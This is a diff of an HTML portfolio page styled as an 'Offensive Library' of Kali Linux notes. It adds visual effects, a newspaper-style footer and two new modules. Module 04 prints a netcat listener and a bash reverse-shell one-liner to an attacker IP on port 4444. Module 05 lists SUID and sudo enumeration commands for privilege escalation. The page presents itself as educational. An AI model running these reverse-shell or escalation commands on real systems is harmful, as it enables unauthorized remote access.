@@ -125,6 +125,78 @@
       margin-bottom: 10px; 
     } 
 
+    /* 6. HACKER AESTHETICS - Glitch, Details */
+    
+    /* Scroll Reveal */
+    .reveal {
+      opacity: 0;
+      transform: translateY(30px);
+      transition: all 0.8s cubic-bezier(0.5, 0, 0, 1);
+    }
+    .reveal.active {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    /* Glitch Effect */
+    .glitch {
+      position: relative;
+    }
+    .glitch::before, .glitch::after {
+      content: attr(data-text);
+      position: absolute;
+      top: 0; left: 0; width: 100%; height: 100%;
+      opacity: 0.8;
+    }
+    .glitch::before {
+      left: 2px;
+      text-shadow: -1px 0 red;
+      clip: rect(44px, 450px, 56px, 0);
+      animation: glitch-anim 5s infinite linear alternate-reverse;
+    }
+    .glitch::after {
+      left: -2px;
+      text-shadow: -1px 0 blue;
+      clip: rect(44px, 450px, 56px, 0);
+      animation: glitch-anim2 5s infinite linear alternate-reverse;
+    }
+    
+    @keyframes glitch-anim {
+      0% { clip: rect(21px, 9999px, 86px, 0); }
+      5% { clip: rect(69px, 9999px, 31px, 0); }
+      10% { clip: rect(100px, 9999px, 91px, 0); }
+      15% { clip: rect(93px, 9999px, 14px, 0); }
+      20% { clip: rect(21px, 9999px, 3px, 0); transform: translate(-2px, 1px); }
+      25% { clip: rect(11px, 9999px, 42px, 0); }
+      100% { clip: rect(8px, 9999px, 16px, 0); transform: translate(0); }
+    }
+    @keyframes glitch-anim2 {
+      0% { clip: rect(29px, 9999px, 83px, 0); }
+      5% { clip: rect(18px, 9999px, 31px, 0); }
+      10% { clip: rect(51px, 9999px, 21px, 0); }
+      15% { clip: rect(32px, 9999px, 90px, 0); transform: translate(2px, -1px); }
+      20% { clip: rect(49px, 9999px, 24px, 0); }
+      100% { clip: rect(66px, 9999px, 19px, 0); transform: translate(0); }
+    }
+
+    /* Typewriter blink */
+    .cursor-blink {
+      display: inline-block;
+      width: 8px;
+      height: 14px;
+      background-color: var(--accent);
+      margin-left: 2px;
+      vertical-align: middle;
+      animation: blink 1s step-end infinite;
+    }
+    @keyframes blink { 50% { opacity: 0; } }
+
+    /* Custom Scrollbar for terminal */
+    .tb::-webkit-scrollbar { height: 4px; }
+    .tb::-webkit-scrollbar-thumb { background: var(--border); }
+    
+    .tb span.typing-line { display: block; overflow: hidden; white-space: pre-wrap; }
+
     </style>
   </head>
 
@@ -137,9 +209,9 @@
 
     <main class="content-wrapper">
 
-      <section class="sp" style="min-height: 60vh; display: flex; flex-direction: column; justify-content: center;">
-        <span class="lb">Kali L inux Daily Driver</span>
-        <h1 class="hx">The Offensive<br><span class="it ac">Library.</span></h1>
+      <section class="sp reveal" style="min-height: 60vh; display: flex; flex-direction: column; justify-content: center;">
+        <span class="lb">Kali Linux Daily Driver</span>
+        <h1 class="hx glitch" data-text="The Offensive Library.">The Offensive<br><span class="it ac">Library.</span></h1>
       </section>
 
       <section class="sp">
@@ -150,19 +222,21 @@
               <a href="#network" class="side-link active">01. Network</a>
               <a href="#AES-256" class="side-link">02. Aes-256</a>
               <a href="#Ports" class="side-link">03. Ports</a>
+              <a href="#payloads" class="side-link">04. Payloads</a>
+              <a href="#privesc" class="side-link">05. PrivEsc</a>
             </div>
           </aside>
 
           <div class="articles">
 
-            <article id="network">
+            <article id="network" class="reveal">
               <span class="lb">Module 01</span>
               <h2 class="hs">Network Auditing</h2>
               <p class="mt" style="font-size: 1.1rem;">
                 As a daily **Kali Linux** user, understanding the handshake process is the first step in auditing wireless infrastructure. This section covers the logic of protocol defense.
               </p>
 
-              <div class="tb">
+              <div class="tb terminal-type">
                 <span class="ac">// Check Wireless Interfaces</span><br>
                 $ iw dev<br><br>
                 <span class="ac">// Start Monitor Mode</span><br>
@@ -174,83 +248,253 @@
               </p>
             </article>
 
-            <article id="AES-256">
+            <article id="AES-256" class="reveal">
               <span class="lb">Module 02</span>
               <h2 class="hs">AES-256 Logic</h2>
               <p class="mt">
                 Implementing encryption in **Python** scripts allows for secure message handling. This module breaks down the implementation of 256-bit AES encryption.
               </p>
-              <div class="tb">
+              <div class="tb terminal-type">
                <span class="ac"># Example Python Snippet</span><br>
                from Crypto.Cipher import AES<br>
                cipher = AES.new(key, AES.MODE_EAX)
              </div>
            </article>
 
-           <article id="Ports">
+           <article id="Ports" class="reveal">
               <span class="lb">Module 03</span>
               <h2 class="hs">Ports</h2>
               <p class="mt">
                 A port is a number that identifies a specific process or service on a computer.<br>
                 They work alongside IP addresses:
               </p>
-              <div class="tb">
+              <div class="tb terminal-type">
                <span class="ac"># Type Of Ports</span><br>
-               Well-known ports (0–1023) <br>
-                Reserved for common services. Examples:<br>
-                80 → HTTP (web traffic)<br>
-                443 → HTTPS (secure web traffic)<br>
-                22 → SSH (secure shell)<br>
-                25 → SMTP (email sending)
+               Well-known ports (0–1023)<br>
+               Reserved for common services. Examples:<br>
+               80 → HTTP (web traffic)<br>
+               443 → HTTPS (secure web traffic)<br>
+               22 → SSH (secure shell)<br>
+               25 → SMTP (email sending)
              </div>
-                <span class="lb-big">⚙️ How Ports Work</span>
-                <div class="tb">
+                <span class="lb-big reveal">⚙️ How Ports Work</span>
+                <div class="tb terminal-type reveal">
                 <ul>
-                  <li><p>When you visit a website, your browser connects to the server’s IP address on port 443 (HTTPS)</p></li>
-                  <li><p>The server responds back to your computer’s ephemeral port (a temporary one in the dynamic range).</p></li>
-                  <li><p>This way, multiple applications can share the same network connection without confusion.</p></li>
+                  <li>When you visit a website, your browser connects to the server’s IP address on port 443 (HTTPS)</li>
+                  <li>The server responds back to your computer’s ephemeral port (a temporary one in the dynamic range).</li>
+                  <li>This way, multiple applications can share the same network connection without confusion.</li>
                 </ul>
              </div>
            </article>
 
-           <!-- Certification section-->
+           <article id="payloads" class="reveal">
+              <span class="lb">Module 04</span>
+              <h2 class="hs">Payload Delivery</h2>
+              <p class="mt">
+                A payload is the actual exploit code executed on a target system. Reverse shells are the standard mechanism for establishing a persistent remote connection.
+              </p>
+              <div class="tb terminal-type">
+               <span class="ac">// Netcat Listener (Attacker Machine)</span><br>
+               $ nc -lvnp 4444<br><br>
+               <span class="ac">// Bash Reverse Shell (Target Machine)</span><br>
+               $ bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+             </div>
+           </article>
 
-           <section class="sp" style="border-top: 1px solid var(--border);">
-            <span class="lb">Credentials // Verification</span>
-            <h2 class="hs">Professional <span class="it ac">Certifications.</span></h2>
-
-            <div style="margin-top: 40px;">
-              <div style="display: flex; justify-content: space-between; padding: 20px 0; border-bottom: 1px solid var(--border);">
-                <div>
-                  <span class="lb" style="margin:0; font-size: 9px;">Entry_01</span>
-                  <p class="it" style="font-size: 1.2rem;">IBM Full Stack Developer</p>
-                </div>
-                <a href="#" id="n1">Verify</a>
-              </div>
-
-              <div style="display: flex; justify-content: space-between; padding: 20px 0; border-bottom: 1px solid var(--border);">
-                <div>
-                  <span class="lb" style="margin:0; font-size: 9px;">Entry_02</span>
-                  <p class="it" style="font-size: 1.2rem;">IBM Front-End Developer</p>
-                </div>
-                <a href="#" id="n1">Verify</a>
-              </div>
-
-
-
-              <div class="tb mt" style="text-align: center; border-style: dashed;">
-                <span class="ac">// 04 additional IBM certifications indexed in database.</span>
-              </div>
-            </div>
-          </section>
+           <article id="privesc" class="reveal" style="margin-bottom: 0;">
+              <span class="lb">Module 05</span>
+              <h2 class="hs">Privilege Escalation</h2>
+              <p class="mt">
+                Gaining initial access usually drops you into a low-privilege user account. The next step is enumerating the system to find misconfigurations and elevate to Root.
+              </p>
+              <div class="tb terminal-type">
+               <span class="ac">// Find SUID binaries (Commands run as owner)</span><br>
+               $ find / -perm -u=s -type f 2>/dev/null<br><br>
+               <span class="ac">// Check sudo permissions</span><br>
+               $ sudo -l
+             </div>
+           </article>
 
         </div> </div> </section>
 
       </main>
 
-      <footer class="sp" style="border-top: 1px solid var(--border); text-align: center;">
-        <p class="lb mt" style="margin:0;">&copy; 2026 GK // Educational Purposes Only</p>
+      <style>
+        .news-grid { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 40px; border-bottom: 2px solid #1A1A1A; padding-bottom: 40px; padding-top: 20px; }
+        .news-col { border-right: 1px solid #1A1A1A; padding-right: 20px; }
+        .news-col:last-child { border-right: none; padding-right: 0; }
+        @media (max-width: 900px) {
+          .news-grid { grid-template-columns: 1fr; gap: 30px; }
+          .news-col { border-right: none; padding-right: 0; border-bottom: 1px solid rgba(26,26,26,0.2); padding-bottom: 20px; }
+          .news-col:last-child { border-bottom: none; }
+        }
+      </style>
+
+      <footer style="margin-top: 80px; background: #EAE6DF; color: #1A1A1A; padding: 60px 5%; border-top: 12px solid #1A1A1A; font-family: 'Times New Roman', Times, serif;">
+        <div style="max-width: 1400px; margin: 0 auto; display: flex; flex-direction: column; gap: 20px;">
+          
+          <!-- Newspaper Header / Masthead -->
+          <div class="reveal" style="border-bottom: 4px double #1A1A1A; padding-bottom: 20px; display: flex; flex-direction: column; align-items: center; position: relative;">
+            <div style="display: flex; justify-content: space-between; width: 100%; font-size: 11px; text-transform: uppercase; font-family: var(--f-body); letter-spacing: 0.1em; border-bottom: 1px solid #1A1A1A; padding-bottom: 8px; margin-bottom: 15px;">
+              <span>Vol. IX &mdash; No. 42</span>
+              <span>Sunday, May 31, 2026</span>
+              <span>Price: 5 Cents</span>
+            </div>
+            <h2 style="font-family: var(--f-display); font-size: clamp(50px, 8vw, 120px); font-weight: normal; margin: 0; text-transform: uppercase; letter-spacing: -0.02em; line-height: 1;">The Daily Ledger</h2>
+            <p style="font-family: var(--f-body); font-size: 13px; text-transform: uppercase; letter-spacing: 0.2em; margin-top: 10px; font-weight: 600; font-style: italic;">"All the code that's fit to ship."</p>
+          </div>
+
+          <!-- Main Content Grid -->
+          <div class="reveal news-grid">
+            
+            <!-- Lead Article / Intro -->
+            <div class="news-col">
+              <h3 style="font-size: 28px; margin: 0 0 15px 0; line-height: 1.1; font-style: italic;">Engineer Exposes Local Vulnerabilities</h3>
+              <p style="font-size: 15px; line-height: 1.6; margin-bottom: 15px; text-align: justify; text-justify: inter-word;">
+                <span style="font-size: 32px; font-weight: bold; float: left; margin: 5px 6px 0 0; line-height: 0.8; font-family: var(--f-display);">T</span>oday marks another milestone in the ongoing efforts to document and analyze fundamental security flaws in modern architecture. The archive compiled within these pages represents an extensive ledger of reverse shells, privilege escalations, and cryptographic implementations. Access to further documentation, professional records, and direct dispatch protocols have been strictly cataloged to the right for authorized personnel.
+              </p>
+              <div style="border-top: 1px dashed rgba(26,26,26,0.3); padding-top: 10px; font-size: 11px; text-transform: uppercase; letter-spacing: 0.1em; font-family: var(--f-body);">
+                Continued on Page A4
+              </div>
+            </div>
+
+            <!-- Classifieds / Links Column 1 -->
+            <div class="news-col" style="display: flex; flex-direction: column; gap: 20px;">
+              <h4 style="font-family: var(--f-body); font-size: 12px; text-transform: uppercase; letter-spacing: 0.2em; border-bottom: 1px solid #1A1A1A; padding-bottom: 5px; margin: 0;">Official Contacts</h4>
+              
+              <a href="mailto:your@email.com" style="text-decoration: none; color: #1A1A1A; display: block; border-bottom: 1px solid rgba(26,26,26,0.2); padding-bottom: 15px; transition: opacity 0.3s;" onmouseover="this.style.opacity='0.5'" onmouseout="this.style.opacity='1'">
+                <span style="font-size: 24px; font-style: italic; display: block; margin-bottom: 8px;">Direct Dispatch</span>
+                <span style="font-size: 13px; display: block; line-height: 1.4;">Via Electronic Mail. Guaranteed delivery within standard routing times.</span>
+              </a>
+
+              <a href="resume.pdf" target="_blank" style="text-decoration: none; color: #1A1A1A; display: block; transition: opacity 0.3s;" onmouseover="this.style.opacity='0.5'" onmouseout="this.style.opacity='1'">
+                <span style="font-size: 24px; font-style: italic; display: block; margin-bottom: 8px;">Official Records</span>
+                <span style="font-size: 13px; display: block; line-height: 1.4;">Curriculum Vitae and professional history available for review in printed format.</span>
+              </a>
+            </div>
+
+            <!-- Classifieds / Links Column 2 -->
+            <div class="news-col" style="display: flex; flex-direction: column; gap: 20px;">
+              <h4 style="font-family: var(--f-body); font-size: 12px; text-transform: uppercase; letter-spacing: 0.2em; border-bottom: 1px solid #1A1A1A; padding-bottom: 5px; margin: 0;">Public Ledgers</h4>
+              
+              <a href="https://www.linkedin.com/in/YOUR_LINKEDIN_HANDLE" target="_blank" rel="noopener noreferrer" style="text-decoration: none; color: #1A1A1A; display: block; border-bottom: 1px solid rgba(26,26,26,0.2); padding-bottom: 15px; transition: opacity 0.3s;" onmouseover="this.style.opacity='0.5'" onmouseout="this.style.opacity='1'">
+                <span style="font-size: 24px; font-style: italic; display: block; margin-bottom: 8px;">LinkedIn Network</span>
+                <span style="font-size: 13px; display: block; line-height: 1.4;">Professional endorsements, employment history, and enterprise connections.</span>
+              </a>
+
+              <a href="https://instagram.com/YOUR_INSTA" target="_blank" rel="noopener noreferrer" style="text-decoration: none; color: #1A1A1A; display: block; transition: opacity 0.3s;" onmouseover="this.style.opacity='0.5'" onmouseout="this.style.opacity='1'">
+                <span style="font-size: 24px; font-style: italic; display: block; margin-bottom: 8px;">Visual Archives</span>
+                <span style="font-size: 13px; display: block; line-height: 1.4;">Photographic evidence and lifestyle documentation broadcasted via Instagram.</span>
+              </a>
+            </div>
+
+          </div>
+
+          <!-- Footer bottom -->
+          <div style="display: flex; flex-wrap: wrap; gap: 20px; justify-content: space-between; align-items: center; padding-top: 10px; font-family: var(--f-body);" class="reveal">
+            <a href="index.html" style="text-decoration: none; font-size: 11px; text-transform: uppercase; letter-spacing: 0.1em; color: #1A1A1A; font-weight: 600;">&larr; Return to Base Logic</a>
+            
+            <div style="font-size: 12px; font-family: monospace; letter-spacing: 0.3em; opacity: 0.6; user-select: none;">
+              ||| | || ||| || ||| | ||| |
+            </div>
+
+            <p style="margin:0; font-size: 10px; text-transform: uppercase; letter-spacing: 0.1em;">&copy; 2026 GK // Printed in Gujarat</p>
+          </div>
+        </div>
       </footer>
 
+      <script>
+        document.addEventListener('DOMContentLoaded', () => {
+          // 1. SCROLL REVEALS
+          const revealElements = document.querySelectorAll('.reveal');
+          const revealObserver = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+              if (entry.isIntersecting) {
+                entry.target.classList.add('active');
+              }
+            });
+          }, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });
+          revealElements.forEach(el => revealObserver.observe(el));
+
+          // 2. TERMINAL TYPING EFFECT
+          const terminalBoxes = document.querySelectorAll('.terminal-type');
+          
+          const typeWriter = (element, htmlContent, index, cursor, callback) => {
+            if (index < htmlContent.length) {
+              // Handle HTML tags so they render instantly instead of being typed char by char
+              if (htmlContent.charAt(index) === '<') {
+                let tag = '';
+                while (htmlContent.charAt(index) !== '>' && index < htmlContent.length) {
+                  tag += htmlContent.charAt(index);
+                  index++;
+                }
+                tag += '>';
+                // Temporarily remove cursor, append tag, restore cursor
+                cursor.remove();
+                element.innerHTML += tag;
+                element.appendChild(cursor);
+                index++;
+                typeWriter(element, htmlContent, index, cursor, callback);
+              } else {
+                cursor.remove();
+                element.innerHTML += htmlContent.charAt(index);
+                element.appendChild(cursor);
+                index++;
+                setTimeout(() => typeWriter(element, htmlContent, index, cursor, callback), 15 + Math.random() * 20);
+              }
+            } else if (callback) {
+              callback();
+            }
+          };
+
+          const terminalObserver = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+              if (entry.isIntersecting) {
+                const box = entry.target;
+                if (box.dataset.typed) return; // Only type once
+                box.dataset.typed = "true";
+
+                // Save raw HTML, clear it
+                const rawHTML = box.innerHTML.trim();
+                box.innerHTML = '';
+                
+                // Add blinking cursor
+                const cursor = document.createElement('span');
+                cursor.className = 'cursor-blink';
+                box.appendChild(cursor);
+
+                // Start typing
+                setTimeout(() => {
+                  typeWriter(box, rawHTML, 0, cursor);
+                }, 400); // slight delay after scroll
+              }
+            });
+          }, { threshold: 0.3 });
+          
+          terminalBoxes.forEach(box => terminalObserver.observe(box));
+
+          // 3. SIDEBAR HIGHLIGHTING
+          const articles = document.querySelectorAll('article');
+          const navLinks = document.querySelectorAll('.side-link');
+          window.addEventListener('scroll', () => {
+            let current = '';
+            articles.forEach(article => {
+              const articleTop = article.offsetTop;
+              if (scrollY >= articleTop - 200) {
+                current = article.getAttribute('id');
+              }
+            });
+            navLinks.forEach(link => {
+              link.classList.remove('active');
+              if (link.getAttribute('href') === `#${current}`) {
+                link.classList.add('active');
+              }
+            });
+          });
+          
+          // Trigger scroll to highlight initial load
+          window.dispatchEvent(new Event('scroll'));
+        });
+      </script>
     </body>
     </html>
